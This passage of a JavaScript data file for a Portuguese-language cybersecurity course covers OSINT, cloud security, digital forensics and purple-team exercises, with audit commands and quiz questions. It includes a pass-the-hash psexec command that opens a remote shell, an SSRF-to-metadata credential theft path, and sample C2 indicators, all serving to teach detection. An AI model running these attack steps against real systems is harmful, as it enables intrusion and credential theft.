            def: "Automatiza OSINT em grande escala. Integra +200 fontes para mapear toda a presença online de um alvo.",
          },
          {
            svgIcon: SVGI.key,
            term: "Have I Been Pwned",
            def: "Verifica se emails ou senhas foram expostos em vazamentos de dados conhecidos.",
          },
        ],
      },
      {
        type: "text",
        title: "OSINT e Privacidade — A Linha Ética",
        content: `OSINT opera em uma zona ética que precisa ser compreendida. A informação é pública — mas a intenção e o uso determinam a legalidade e ética da coleta.

Usar OSINT para investigar uma empresa durante um pentest contratado: legal e ético. Usar as mesmas técnicas para mapear um indivíduo sem autorização para stalking ou assédio: crime em praticamente todas as jurisdições. A técnica é idêntica; o contexto muda tudo.

No Brasil, a LGPD estabelece que dados pessoais — mesmo publicamente acessíveis — têm proteção legal quando processados sem finalidade legítima. Profissionais de OSINT devem documentar sua autorização, finalidade e limites antes de qualquer investigação envolvendo dados de pessoas físicas.`,
      },
    ],
    lokiQuestions: [
      {
        question: "O que o Shodan faz que o Google não faz?",
        options: [
          "Indexa páginas web mais rapidamente",
          "Indexa dispositivos conectados à internet, não páginas web — servidores, câmeras, ICS",
          "Busca informações em redes sociais",
          "Acessa a dark web automaticamente",
        ],
        correct: 1,
        explanation:
          "Shodan indexa banners de serviços em portas abertas de dispositivos — não conteúdo de páginas web.",
      },
      {
        question:
          "O que o ExifTool pode revelar ao analisar uma foto postada nas redes sociais?",
        options: [
          "Apenas o tamanho e resolução da imagem",
          "A localização GPS, câmera usada, data/hora — e às vezes o nome do arquivo original",
          "Vulnerabilidades no servidor que hospeda a imagem",
          "Metadados são sempre removidos pelas redes sociais automaticamente",
        ],
        correct: 1,
        explanation:
          "Fotos não editadas contêm metadados EXIF: GPS, câmera, configurações, horário exato — ouro para OSINT.",
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 7 — SEGURANÇA EM CLOUD
  ───────────────────────────────────────────────────────── */
  {
    id: "cloud",
    title: "Segurança em Cloud",
    subtitle: "AWS, Azure, GCP — o novo perímetro",
    locked: true,
    unlockAfter: "osint",
    svgIcon: SVGI.cloud,
    estimatedMin: 15,
    sections: [
      {
        type: "text",
        title: "Cloud Mudou Tudo",
        content: `A adoção massiva de cloud computing redefiniu o conceito de perímetro de segurança. Não existe mais um data center físico com um firewall na borda — existem centenas de serviços, buckets, funções serverless, APIs e permissões distribuídas em múltiplas regiões, gerenciados por dezenas de equipes diferentes.

O modelo de responsabilidade compartilhada (Shared Responsibility Model) é fundamental: a AWS/Azure/GCP são responsáveis pela segurança da infraestrutura — servidores físicos, hipervisor, rede. Você é responsável pela segurança na nuvem — dados, identidades, configurações, aplicações.

A principal causa de violações em cloud não é hacking sofisticado — são misconfigurações. Um bucket S3 público, uma instância EC2 com credenciais hardcoded, um grupo de segurança com 0.0.0.0/0 — esses erros custam milhões.`,
      },
      {
        type: "cards",
        title: "Principais Vetores de Ataque em Cloud",
        cards: [
          {
            svgIcon: SVGI.lock,
            term: "IAM Misconfiguration",
            def: "Permissões excessivas (overprivileged). Princípio do mínimo privilégio violado. Um role com AdministratorAccess no lugar errado é game over.",
          },
          {
            svgIcon: SVGI.cloud,
            term: "Exposed Storage",
            def: "S3 buckets, Azure Blobs, GCS buckets com leitura pública. Bilhões de registros vazaram assim.",
          },
          {
            svgIcon: SVGI.server,
            term: "IMDS Exploitation",
            def: "SSRF → acesso ao Instance Metadata Service (169.254.169.254) → credenciais IAM temporárias. IMDSv2 mitiga isso.",
          },
          {
            svgIcon: SVGI.key,
            term: "Credential Exposure",
            def: "Chaves de API no GitHub, variáveis de ambiente em logs, access keys hardcoded no código.",
          },
          {
            svgIcon: SVGI.terminal,
            term: "Serverless Attacks",
            def: "Funções Lambda/Azure Functions com permissões excessivas, variáveis de ambiente sensíveis, injection em triggers.",
          },
          {
            svgIcon: SVGI.layers,
            term: "Supply Chain",
            def: "Imagens de container maliciosas, dependências comprometidas, CI/CD com acesso a produção sem aprovação.",
          },
        ],
      },
      {
        type: "code",
        language: "bash",
        title: "AWS Security — Verificações Essenciais",
        description:
          "Comandos para auditar configurações básicas de segurança em AWS:",
        code: `# ─── IAM ───
# Verificar usuários com AdministratorAccess
aws iam list-attached-user-policies --user-name <user>
# Verificar se MFA está habilitado no root
aws iam get-account-summary | grep "AccountMFAEnabled"
# Listar access keys e quando foram usadas
aws iam list-access-keys --user-name <user>

# ─── S3 ───
# Listar buckets públicos
aws s3api list-buckets --query "Buckets[].Name" --output text | \
  xargs -I{} aws s3api get-bucket-acl --bucket {}
# Verificar Block Public Access
aws s3api get-public-access-block --bucket <bucket-name>

# ─── CloudTrail ───
# Verificar se está habilitado em todas as regiões
aws cloudtrail describe-trails --include-shadow-trails

# ─── Security Groups ───
# Encontrar SGs com acesso SSH de qualquer lugar (0.0.0.0/0)
aws ec2 describe-security-groups \
  --query "SecurityGroups[?IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0'] && FromPort==\`22\`]]"

# ─── Ferramentas de auditoria ───
# ScoutSuite, Prowler, CloudSploit, Checkov`,
      },
      {
        type: "text",
        title: "Zero Trust Architecture",
        content: `Zero Trust é um modelo de segurança baseado no princípio "nunca confie, sempre verifique". Em vez de um perímetro de confiança implícita (dentro da rede corporativa = confiável), cada requisição é autenticada, autorizada e verificada — independente de origem.

Os pilares do Zero Trust: verificação explícita de identidade em cada acesso, acesso de mínimo privilégio (just-in-time, just-enough-access), e assumir que já houve comprometimento (assume breach). Isso se traduz em: MFA obrigatório, micro-segmentação de rede, ZTNA (Zero Trust Network Access) substituindo VPNs tradicionais, e monitoramento contínuo de comportamento.

Microsoft, Google e o NIST publicaram frameworks detalhados de implementação. Em cloud, Zero Trust é a arquitetura padrão recomendada.`,
      },
      {
        type: "cards",
        title: "Ferramentas de Segurança Cloud",
        cards: [
          {
            svgIcon: SVGI.search,
            term: "ScoutSuite",
            def: "Auditoria multi-cloud (AWS/Azure/GCP). Identifica misconfigurações e gera relatório HTML com severidade.",
          },
          {
            svgIcon: SVGI.shield,
            term: "Prowler",
            def: "Ferramenta open-source focada em AWS. 300+ checks baseados em CIS Benchmark e AWS Security Hub.",
          },
          {
            svgIcon: SVGI.code,
            term: "Checkov",
            def: "Análise estática de IaC (Terraform, CloudFormation). Detecta misconfigurações antes do deploy.",
          },
          {
            svgIcon: SVGI.eye,
            term: "Falco",
            def: "Runtime security para Kubernetes. Detecta comportamento anômalo em containers em tempo real.",
          },
          {
            svgIcon: SVGI.server,
            term: "Trivy",
            def: "Scanner de vulnerabilidades em imagens de container, IaC e sistemas de arquivos. Integra com CI/CD.",
          },
          {
            svgIcon: SVGI.layers,
            term: "CSPM Tools",
            def: "Cloud Security Posture Management. Wiz, Orca, Prisma Cloud — visibilidade contínua de riscos em cloud.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "Shared Responsibility Model",
        description: "O que é responsabilidade sua vs. da cloud provider:",
        code: `SHARED RESPONSIBILITY MODEL — AWS

RESPONSABILIDADE DA AWS (Security OF the Cloud)
  ✓ Hardware físico e data centers
  ✓ Rede global e infraestrutura
  ✓ Hipervisor e virtualização
  ✓ Software de serviços gerenciados (RDS, S3, Lambda)

SUA RESPONSABILIDADE (Security IN the Cloud)
  ✓ Dados dos clientes — criptografia em repouso e em trânsito
  ✓ IAM — usuários, roles, políticas, MFA
  ✓ Configuração de rede — VPCs, Security Groups, NACLs
  ✓ Sistema operacional das instâncias EC2 — patches, firewall
  ✓ Aplicações — código, dependências, configuração
  ✓ Configuração dos serviços — S3 public access, RDS encryption

ZONA CINZA (varia por serviço):
  EC2: você gerencia o OS completo
  RDS: AWS gerencia o OS/DB engine; você gerencia dados e acesso
  Lambda: AWS gerencia tudo exceto código e permissões IAM

REGRA: se você CONFIGUROU, é sua responsabilidade.`,
      },
    ],
    lokiQuestions: [
      {
        question: "O que é o Shared Responsibility Model na cloud?",
        options: [
          "Um acordo de SLA entre cliente e provedor de cloud",
          "A divisão de responsabilidades: o provedor garante a infraestrutura; você garante dados, identidades e configurações",
          "Um modelo de custo compartilhado entre equipes",
          "Uma política de backup compartilhado entre regiões",
        ],
        correct: 1,
        explanation:
          "O provedor é responsável PELA nuvem (hardware, rede, hipervisor). Você é responsável NA nuvem (dados, IAM, configurações).",
      },
      {
        question:
          "Qual é a principal causa de violações de segurança em ambientes cloud?",
        options: [
          "Vulnerabilidades zero-day nos serviços da AWS/Azure/GCP",
          "Ataques DDoS à infraestrutura do provedor",
          "Misconfigurações: buckets públicos, IAM excessivo, credenciais expostas",
          "Ataques físicos aos data centers",
        ],
        correct: 2,
        explanation:
          "Estudos consistentes mostram que misconfigurações causam a maioria das violações em cloud — não exploits sofisticados.",
      },
      {
        question: "O que é Zero Trust Architecture?",
        options: [
          "Bloquear todo o acesso externo à rede corporativa",
          "Nunca confiar, sempre verificar — cada acesso é autenticado independente da origem",
          "Usar apenas serviços de cloud aprovados pelo time de segurança",
          "Remover todos os privilégios de administrador dos usuários",
        ],
        correct: 1,
        explanation:
          'Zero Trust: "never trust, always verify". Sem confiança implícita por localização de rede — verificação explícita em cada acesso.',
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 8 — FORENSE DIGITAL
  ───────────────────────────────────────────────────────── */
  {
    id: "forense",
    title: "Forense Digital",
    subtitle: "Reconstruindo o que aconteceu",
    locked: true,
    unlockAfter: "cloud",
    svgIcon: SVGI.search,
    estimatedMin: 14,
    sections: [
      {
        type: "text",
        title: "O que é Forense Digital?",
        content: `Forense digital é a disciplina de coletar, preservar e analisar evidências digitais de forma que mantenha sua integridade para uso em investigações — seja um processo judicial, investigação interna corporativa ou resposta a incidentes de segurança.

A premissa fundamental: evidências digitais são frágeis e perecíveis. Ligar um computador comprometido pode sobrescrever artefatos na memória RAM. Acessar um arquivo altera seu timestamp de acesso. Cada ação no sistema alvo modifica o estado — e pode tornar evidências inadmissíveis ou inutilizáveis.

O princípio de Locard ("todo contato deixa um traço") se aplica duplamente ao mundo digital: o invasor deixou rastros, mas o investigador também deixa. A arte é minimizar a contaminação enquanto extrai o máximo de evidências.`,
      },
      {
        type: "cards",
        title: "Ordem de Volatilidade — O que Coletar Primeiro",
        cards: [
          {
            svgIcon: SVGI.cpu,
            term: "① Memória RAM",
            def: "Mais volátil. Processos em execução, conexões de rede, credenciais não criptografadas, malware fileless. Desligar = perder tudo.",
          },
          {
            svgIcon: SVGI.activity,
            term: "② Cache / Registros",
            def: "CPU cache, registros do sistema, cache de ARP e DNS. Segundos/minutos de vida após o evento.",
          },
          {
            svgIcon: SVGI.server,
            term: "③ Estado da Rede",
            def: "Conexões estabelecidas, portas abertas, processos escutando. Netstat, ss — capture antes de desconectar.",
          },
          {
            svgIcon: SVGI.layers,
            term: "④ Disco (Volume)",
            def: "Menos volátil mas ainda modificável. Sistema de arquivos, logs, artefatos de execução, registro do Windows.",
          },
          {
            svgIcon: SVGI.database,
            term: "⑤ Logs Remotos",
            def: "SIEM, syslog remoto, CloudTrail. Mais difícil de adulterar — o adversário raramente tem acesso ao SIEM.",
          },
          {
            svgIcon: SVGI.globe,
            term: "⑥ Mídia Física",
            def: "Discos físicos, pendrives, câmeras. Análise offline com write blockers para garantir integridade.",
          },
        ],
      },
      {
        type: "code",
        language: "bash",
        title: "Coleta de Evidências — Live Response Linux",
        description:
          "Comandos para captura de evidências sem alterar o sistema comprometido:",
        code: `# ─── Sempre primeiro: hashing do ambiente ───
# Documento ANTES de qualquer coleta
date >> /media/usb/evidence.log
hostname >> /media/usb/evidence.log
whoami >> /media/usb/evidence.log

# ─── Memória RAM (prioritário) ───
# LiME (Linux Memory Extractor):
sudo insmod lime.ko "path=/media/usb/ram.lime format=lime"
# Verificar hash: sha256sum /media/usb/ram.lime

# ─── Estado atual da rede ───
ss -tulnap >> /media/usb/network.txt      # portas e processos
netstat -an >> /media/usb/netstat.txt     # conexões estabelecidas
arp -a >> /media/usb/arp.txt              # cache ARP
cat /proc/net/tcp >> /media/usb/tcp.txt

# ─── Processos e usuários ───
ps auxf >> /media/usb/processes.txt       # árvore de processos
w >> /media/usb/users.txt                 # usuários logados
last -50 >> /media/usb/logins.txt        # últimos logins

# ─── Artefatos de persistência ───
crontab -l >> /media/usb/cron.txt
cat /etc/crontab >> /media/usb/cron.txt
systemctl list-units --type=service >> /media/usb/services.txt
find /tmp /var/tmp -type f -newer /tmp >> /media/usb/recent.txt

# ─── Imagem do disco (read-only) ───
# NUNCA monte o disco do suspeito sem write blocker
dd if=/dev/sda bs=4M | sha256sum > /media/usb/disk_hash.txt`,
      },
      {
        type: "text",
        title: "Análise de Malware — Abordagens",
        content: `Quando um artefato suspeito é encontrado durante a investigação, a análise de malware determina o que ele faz, como opera e quais indicadores de comprometimento gera.

Análise estática examina o binário sem executá-lo: strings visíveis, imports de DLLs, estrutura do PE (Portable Executable), código assembly. Ferramentas: strings, PEStudio, Ghidra, IDA Pro. Risco zero de infecção, mas limitada para malware ofuscado.

Análise dinâmica executa o malware em ambiente controlado (sandbox) e observa o comportamento: arquivos criados/modificados, chaves de registro alteradas, conexões de rede, processos gerados. Ferramentas: Any.run, Cuckoo Sandbox, REMnux. Revela muito mais que a análise estática, mas requer isolamento rigoroso.

A combinação das duas (análise híbrida) é o padrão profissional.`,
      },
      {
        type: "cards",
        title: "Artefatos Forenses Chave no Windows",
        cards: [
          {
            svgIcon: SVGI.database,
            term: "Prefetch",
            def: "C:\\Windows\\Prefetch. Registra quando e quantas vezes um executável foi rodado. Malware executado fica aqui.",
          },
          {
            svgIcon: SVGI.server,
            term: "Registry Hives",
            def: "SAM, SYSTEM, SOFTWARE, NTUSER.DAT. Guarda persistência, configurações, histórico de execução, credenciais.",
          },
          {
            svgIcon: SVGI.activity,
            term: "Event Logs",
            def: "Security.evtx (4624 logon, 4688 process), System.evtx, Application.evtx. Cronologia de eventos do sistema.",
          },
          {
            svgIcon: SVGI.scroll,
            term: "MFT (NTFS)",
            def: "Master File Table. Registro de todos os arquivos, incluindo deletados. Timestamps: MACE (Modified, Accessed, Changed, Entry).",
          },
          {
            svgIcon: SVGI.layers,
            term: "LNK Files",
            def: "Atalhos que registram arquivos recentemente abertos — mesmo de dispositivos removíveis. Goldmine forense.",
          },
          {
            svgIcon: SVGI.terminal,
            term: "PowerShell Logs",
            def: "Script Block Logging, Module Logging, Transcription. Registra comandos PowerShell — deve estar habilitado.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "IOCs — Indicadores de Comprometimento",
        description:
          "Artefatos observáveis que confirmam ou indicam um incidente de segurança:",
        code: `TIPOS DE IOCs (Indicators of Compromise)

─── NÍVEL DE REDE ───
  IP malicioso:     192.168.100.5 (C2 server)
  Domínio C2:       evil-domain.ru
  User-Agent:       "Mozilla/5.0 (compatible; Risky/1.0)"
  Padrão de tráfego: beacon a cada 60s para IP externo
  DNS anômalo:      queries para domínios DGA gerados algoritmicamente

─── NÍVEL DE HOST ───
  Hash MD5/SHA256:  a1b2c3d4e5... (hash do malware)
  Arquivo:   C:\\Users\\user\\AppData\\Roaming\\svchost.exe
Registro:  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\malware
Mutex:     Global\\\\MutexPayload123
  Processo:         explorer.exe com parent powershell.exe

─── MODELO PIRÂMIDE DA DOR (David Bianco) ───
  Hashes        → Trivial de mudar para atacante
  IPs/Domínios  → Fácil de mudar
  Artefatos     → Incômodo de mudar
  Ferramentas   → Desafiador de mudar
  TTPs          → DIFÍCIL de mudar — foca aqui

→ IOCs de TTPs (MITRE ATT&CK) têm mais valor que hashes`,
      },
    ],
    lokiQuestions: [
      {
        question:
          "Por que a memória RAM deve ser coletada primeiro em uma investigação forense?",
        options: [
          "RAM contém mais dados que o disco rígido",
          "É o artefato mais volátil — desligar o sistema apaga todo o conteúdo da memória",
          "A análise de RAM é mais simples que a análise de disco",
          "RAM é mais fácil de preservar como evidência legal",
        ],
        correct: 1,
        explanation:
          "RAM é volátil — processos, credenciais, malware fileless e conexões ativas são perdidos ao desligar o sistema.",
      },
      {
        question:
          'O que é a "Pirâmide da Dor" no contexto de Threat Intelligence?',
        options: [
          "Um modelo que classifica o impacto de ataques por severidade",
          "Uma hierarquia que mostra o quanto é difícil para atacantes mudar diferentes tipos de IOCs",
          "Um framework de resposta a incidentes com 5 etapas",
          "Uma classificação de malware por capacidade de dano",
        ],
        correct: 1,
        explanation:
          'Pirâmide da Dor: hashes são fáceis de mudar; TTPs são difíceis. Focar em TTPs causa mais "dor" ao adversário.',
      },
      {
        question:
          "Qual arquivo Windows registra quando executáveis foram rodados e quantas vezes?",
        options: [
          "Registry SAM",
          "Event Log Security.evtx",
          "Prefetch (C:\\Windows\\Prefetch)",
          "Pagefile.sys",
        ],
        correct: 2,
        explanation:
          "Prefetch registra execução de programas incluindo data/hora e contagem — fundamental para cronologia forense.",
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 9 — TEAM PURPLE & MITRE ATT&CK
  ───────────────────────────────────────────────────────── */
  {
    id: "purple",
    title: "Team Purple & MITRE ATT&CK",
    subtitle: "A Sinergia entre Ataque e Defesa",
    locked: true,
    unlockAfter: "forense",
    svgIcon: SVGI.activity,
    estimatedMin: 12,
    sections: [
      {
        type: "text",
        title: "Por que Purple?",
        content: `Em muitas organizações, Red e Blue operam em silos. O Red Team faz um engajamento de 2 semanas, entrega um relatório de 80 páginas e vai embora. O Blue Team recebe o relatório, prioriza os itens críticos e fecha os tickets. Nada muda na capacidade de detecção.

O Team Purple nasceu para quebrar esse padrão. Em vez de Red e Blue trabalhando separadamente e se encontrando apenas no relatório final, Purple coloca os dois times trabalhando juntos em tempo real: o Red executa uma técnica de ataque, o Blue verifica se detectou, e ambos iteram juntos até que a detecção funcione.

O objetivo não é ver quem "ganha" — é maximizar a maturidade da segurança da organização.`,
      },
      {
        type: "cards",
        title: "MITRE ATT&CK — As 14 Táticas",
        cards: [
          {
            svgIcon: SVGI.search,
            term: "Reconnaissance",
            def: "Coleta de informações antes do ataque. Varreduras, OSINT, phishing de informações.",
          },
          {
            svgIcon: SVGI.server,
            term: "Resource Development",
            def: "Preparar infraestrutura: servidores C2, domínios, ferramentas, contas falsas.",
          },
          {
            svgIcon: SVGI.lock,
            term: "Initial Access",
            def: "Ganhar entrada inicial. Phishing, exploração de serviços públicos, supply chain.",
          },
          {
            svgIcon: SVGI.terminal,
            term: "Execution",
            def: "Executar código malicioso. PowerShell, scripts, exploração de aplicações.",
          },
          {
            svgIcon: SVGI.layers,
            term: "Persistence",
            def: "Manter acesso após reboot ou mudança de credenciais.",
          },
          {
            svgIcon: SVGI.zap,
            term: "Privilege Escalation",
            def: "Obter permissões maiores. Exploits de kernel, misconfigurações.",
          },
          {
            svgIcon: SVGI.eye,
            term: "Defense Evasion",
            def: "Evitar detecção. Ofuscação, desabilitar ferramentas de segurança, masquerade.",
          },
          {
            svgIcon: SVGI.key,
            term: "Credential Access",
            def: "Roubar credenciais. Keylogging, brute force, credential dumping.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "Exemplo de Exercício Purple — Pass-the-Hash",
        description:
          "Como Red e Blue colaboram para melhorar detecção de uma técnica específica:",
        code: `EXERCÍCIO PURPLE: Pass-the-Hash (T1550.002 no MITRE ATT&CK)

[RED] Executa a técnica:
  → Usa hash NTLM para autenticar sem a senha
  → Comando: python3 psexec.py -hashes :aabbccdd admin@192.168.1.10
  → Obtém shell no sistema-alvo

[BLUE] Verifica: foi detectado?
  → Consulta SIEM: eventos 4624 com LogonType 3 + NtlmV1
  → Resultado: NÃO detectado — sem regra para esse padrão

[PURPLE] Colaboração:
  → Analisam os logs do evento que ocorreu
  → Identificam assinatura: EventID 4624, LogonType=3,
    AuthPackage=NTLM, WorkstationName ≠ hostname
  → Criam regra Sigma e implementam no SIEM

[RED] Re-executa a técnica
[BLUE] Confirma: DETECTADO ✓

Resultado: cobertura de detecção melhorou.
Documentado no ATT&CK Navigator como técnica coberta.`,
      },
      {
        type: "cards",
        title: "Atomic Red Team — Testes Controlados",
        cards: [
          {
            svgIcon: SVGI.zap,
            term: "Atomic Tests",
            def: 'Biblioteca open-source da Red Canary. Cada "átomo" executa uma única técnica do ATT&CK de forma isolada e reproduzível.',
          },
          {
            svgIcon: SVGI.layers,
            term: "ATT&CK Navigator",
            def: "Ferramenta oficial do MITRE para mapear visualmente quais técnicas têm cobertura de detecção.",
          },
          {
            svgIcon: SVGI.cpu,
            term: "Caldera (MITRE)",
            def: "Framework de adversary emulation automatizado. Executa operações completas de Red Team de forma programática.",
          },
          {
            svgIcon: SVGI.activity,
            term: "Detection Engineering",
            def: "Criar e refinar regras de detecção (Sigma) com base em técnicas que o Red confirmou que funcionam no ambiente.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "Purple Team Maturity Model",
        description:
          "Como avaliar a maturidade do programa Purple em uma organização:",
        code: `MODELO DE MATURIDADE PURPLE TEAM

NÍVEL 1 — AD HOC
  → Red e Blue comunicam-se apenas via relatório final
  → Sem exercícios colaborativos formais
  → > 80% das técnicas ATT&CK sem cobertura

NÍVEL 2 — DEFINIDO
  → Exercícios Purple trimestrais com escopo definido
  → Regras de detecção criadas após cada engajamento
  → ATT&CK Navigator atualizado
  → 40-60% das técnicas prioritárias cobertas

NÍVEL 3 — GERENCIADO
  → Exercícios mensais focados em adversários específicos
  → Detection Engineering formalizado
  → MTTD (Mean Time to Detect) < 24h
  → 70-80% das técnicas críticas cobertas

NÍVEL 4 — OTIMIZADO
  → Exercícios contínuos (purple team as a service)
  → Threat-informed defense baseada em inteligência real
  → MTTD < 1h para técnicas de alta prioridade
  → > 90% de cobertura, métricas em tempo real`,
      },
    ],
    lokiQuestions: [
      {
        question: "Qual o principal problema que o Team Purple resolve?",
        options: [
          "Red Teams não conseguem encontrar vulnerabilidades avançadas",
          "Blue Teams não têm ferramentas suficientes",
          "Red e Blue operando em silos, sem transferência real de conhecimento",
          "Falta de orçamento para segurança",
        ],
        correct: 2,
        explanation:
          "Purple quebra o silo: em vez de relatório entregue ao final, Red e Blue iteram juntos em tempo real.",
      },
      {
        question: "O que é Adversary Emulation?",
        options: [
          "Criar um vírus que imita comportamento humano",
          "Replicar as TTPs de um adversário específico para testar se as defesas os detectariam",
          "Usar IA para simular ataques automatizados",
          "Treinar funcionários para resistir a phishing",
        ],
        correct: 1,
        explanation:
          "Emulation = reproduzir exatamente como um grupo de ameaça específico opera para ver se você o detectaria.",
      },
      {
        question: 'O que é o "Atomic Red Team"?',
        options: [
          "Uma equipe especializada em ataques nucleares simulados",
          "Uma biblioteca de testes unitários para código de segurança",
          "Uma biblioteca open-source de testes mapeados ao MITRE ATT&CK para validar detecções",
          "Um framework de certificação para Red Teams",
        ],
        correct: 2,
        explanation:
          "Atomic Red Team (Red Canary): cada teste executa uma única técnica do ATT&CK, permitindo validar cobertura de detecção.",
      },
    ],
  },
];
